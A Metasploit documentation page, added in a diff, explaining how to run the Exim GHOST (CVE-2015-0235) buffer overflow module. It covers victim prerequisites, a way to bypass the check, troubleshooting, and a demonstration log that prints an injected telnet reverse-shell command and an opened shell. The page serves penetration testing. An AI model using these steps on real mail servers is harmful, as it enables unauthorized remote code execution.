@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Git Reference Sites | Metasploit spike</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="Git Reference Sites" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Learning Git" />
+<meta property="og:description" content="Learning Git" />
+<link rel="canonical" href="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:url" content="/metasploit-framework/articles/Git-Reference-Sites.html" />
+<meta property="og:site_name" content="Metasploit spike" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-01-12T17:14:28+00:00" />
+<script type="application/ld+json">
+{"description":"Learning Git","headline":"Git Reference Sites","dateModified":"2012-01-12T17:14:28+00:00","datePublished":"2012-01-12T17:14:28+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/metasploit-framework/articles/Git-Reference-Sites.html"},"url":"/metasploit-framework/articles/Git-Reference-Sites.html","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/metasploit-framework/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/metasploit-framework/feed.xml" title="Metasploit spike" /></head>
+<body><header class="site-header" role="banner">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/metasploit-framework/">Metasploit spike</a><nav class="site-nav">
+          <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+          <label for="nav-trigger">
+            <span class="menu-icon">
+              <svg viewBox="0 0 18 15" width="18px" height="15px">
+                <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+              </svg>
+            </span>
+          </label>
+  
+          <div class="trigger">
+            <a class="page-link" href="/metasploit-framework/">Articles</a><a class="page-link" href="/metasploit-framework/modules/">Modules</a></div>
+        </nav></div>
+  </header>
+  <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">How to use exim_gethostbyname_bof.rb (Exim GHOST Buffer Overflow)</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2015-03-20T06:45:12+00:00" itemprop="datePublished">Mar 20, 2015
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>The Exim GHOST buffer overflow is a vulnerability found by researchers from Qualys. On March 17th 2015, Qualys released an exploit module demonstrating the exploitability of this flaw, which is now exim_gethostbyname_bof.rb in Metasploit Framework.</p>
+
+<p>When Qualys released the exploit, it included a lot of technical details for debugging and usage purposes. We decided to put all that here in a more readable format.</p>
+
+<h2 id="what-is-ghost">What is “GHOST”</h2>
+
+<p>This is a heap based buffer overflow found in GNU C Library’s <strong>g</strong>et<strong>host</strong>byname functions since glibc-2.2 (November 10, 2000), which is part of the Linux operating system, such as: Debian, Red Hat, CentOS, and Ubuntu.</p>
+
+<h2 id="exploitable-requirements">Exploitable Requirements</h2>
+
+<p><strong>On the server-side (victim):</strong></p>
+
+<ul>
+  <li>glibc-2.6 - glibc-2.17: The exploit depends on the newer versions’ fd_nextsize (a member of the malloc_chunk structure) to remotely obtain the address of Exim’s smtp_cmd_buffer in the heap.</li>
+  <li>Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit depends on the newer versions’ 16-KB smtp_cmd_buffer to reliably set up the heap as described in the advisory.</li>
+  <li>The Exim server also must enable helo_try_verify_hosts or helo_verify_hosts in the /etc/exim4/exim4.conf.template file. The “verify = helo” ACL might be exploitable too, but the attack vector isn’t as reliable, therefore not supported by the module.</li>
+</ul>
+
+<p>For testing purposes, if you need to find a vulnerable system, you can try Debian 7 (it should come with an exploitable Exim server):
+http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso</p>
+
+<p><strong>On the attacker’s side:</strong></p>
+
+<ul>
+  <li>The attacker’s IPv4 address must have both forward and reverse DNS entries that match each other (Forward-Confirmed reverse DNS).</li>
+</ul>
+
+<h2 id="the-check-method">The check method</h2>
+
+<p>The GHOST exploit module comes with a check method. It is explicit, which means the check will actually try to trigger the vulnerability to determine if the host is vulnerable or not.</p>
+
+<p>The check is also enforced when you use the “exploit” or “run” command. However, you can turn off the enforcement by setting the <code class="highlighter-rouge">FORCE_EXPLOIT</code> datastore option to true. For example:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set FORCE_EXPLOIT true
+run
+</code></pre></div></div>
+
+<h2 id="troubleshooting">Troubleshooting</h2>
+
+<p>If the exim_gethostbyname_bof.rb module has failed on you:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Failure</th>
+      <th>Explanation</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (nil)</td>
+      <td>The SENDER_HOST_ADDRESS datastore option was not specified</td>
+    </tr>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation)</td>
+      <td>The SENDER_HOST_ADDRESS datastore option was specified, but not in IPv4 dotted-decimal notation</td>
+    </tr>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (helo_verify_hosts)</td>
+      <td>The SENDER_HOST_ADDRESS datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim).</td>
+    </tr>
+    <tr>
+      <td>bad SENDER_HOST_ADDRESS (no FCrDNS)</td>
+      <td>the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS.</td>
+    </tr>
+    <tr>
+      <td>not vuln? old glibc? (no leaked_arch)</td>
+      <td>the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd_nextsize member in their malloc_chunk structure).</td>
+    </tr>
+    <tr>
+      <td>NUL, CR, LF in addr? (no leaked_addr)</td>
+      <td>Exim’s heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved).</td>
+    </tr>
+    <tr>
+      <td>Brute-force SUCCESS” followed by a nil reply, but no shell</td>
+      <td>the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc).</td>
+    </tr>
+    <tr>
+      <td>Brute-force SUCCESS” followed by a non-nil reply, and no shell</td>
+      <td>The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn’t exist, or awk isn’t gawk, or netcat doesn’t support the -6 or -e option, or telnet doesn’t support the -z option, etc).</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="module-demonstration">Module Demonstration</h2>
+
+<p>When everything is dialed in correctly, a successful attack should look like the following:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(exim_gethostbyname_bof) &gt; run
+
+[*] Started reverse double handler
+[*] Trying information leak...
+[!] {:heap_shift=&gt;736}
+[!] {:write_offset=&gt;128, :error=&gt;"503 sender not yet given"}
+[!] {:write_offset=&gt;136, :error=&gt;"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"}
+[!] {:error=&gt;["\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given", "", "503 \x89\x10", "177", "177\\177\\177", "vJN\\177\\177\\177\\177"]}
+[!] {:leaked_arch=&gt;"x86"}
+[!] {:count=&gt;{"\xE0.\xFF\xB7\xE0.\xFF\xB7er not yet given"=&gt;8, "hF\xFE\xB7hF\xFE\xB7er not yet given"=&gt;2}}
+[+] Successfully leaked_arch: x86
+[+] Successfully leaked_addr: b7fda760
+[*] Trying code execution...
+[!] ${run{/usr/bin/env setsid /bin/sh -c "sh -c '(sleep 4011|telnet 192.168.1.64 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 192.168.1.64 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)'"}}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fda760", :offset=&gt;21}
+[!] {:reply=&gt;{:code=&gt;"250", :lines=&gt;["250 Accepted\r\n"]}}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fda760", :offset=&gt;25}
+[!] {:reply=&gt;{:code=&gt;"250", :lines=&gt;["250 Accepted\r\n"]}}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd8fd7", :offset=&gt;20}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd8fd7", :offset=&gt;8}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd784e", :offset=&gt;6}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd784e", :offset=&gt;12}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd60c5", :offset=&gt;19}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd60c5", :offset=&gt;29}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd493c", :offset=&gt;23}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd493c", :offset=&gt;18}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd31b3", :offset=&gt;14}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd31b3", :offset=&gt;3}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd1a2a", :offset=&gt;29}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd1a2a", :offset=&gt;28}
+[!] {:helo=&gt;6144, :step=&gt;6025, :addr=&gt;"b7fd02a1", :offset=&gt;26}
+[!] {:reply=&gt;{:code=&gt;"550", :lines=&gt;["550 sikVtqGxFOjCBOWTbDupmIuJRmLmShFNqqUYRRPUolyxPmmgLCenEzConuVGWafjgycyRfXulGNwmAOvkqZkGobMyUIMPojZsaziCjVVyvabOrcieEWrLZSgnCCXHeXjIzGGfUALAIubgBEmsKsSWSGa\r\n"]}}
+[+] Brute-force SUCCESS
+[+] Please wait for reply...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo qaNpBmRBEus9XoVZ;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket A
+[*] A: "qaNpBmRBEus9XoVZ\r\n"
+[*] Matching...
+[*] B is input...
+[*] Command shell session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.166:58859) at 2015-03-19 03:36:52 -0500
+[!] {:reply=&gt;nil}
+
+id
+uid=104(Debian-exim) gid=112(Debian-exim) groups=112(Debian-exim)
+</code></pre></div></div>
+
+<h2 id="references">References:</h2>
+
+<ul>
+  <li>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-0235</li>
+  <li>https://community.qualys.com/blogs/laws-of-vulnerabilities/2015/03/17/ghost-remote-code-execution-exploit</li>
+  <li>https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.171218720.101498705.1426692159</li>
+  <li>https://www.qualys.com/research/security-advisories/GHOST-CVE-2015-0235.txt?_ga=1.136230833.101498705.1426692159</li>
+</ul>
+
+  </div><a class="u-url" href="/metasploit-framework/articles/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow).html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/metasploit-framework/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Metasploit spike</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Metasploit spike</li><li><a class="u-email" href="mailto:your-email@example.com">your-email@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/metasploit-framework/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
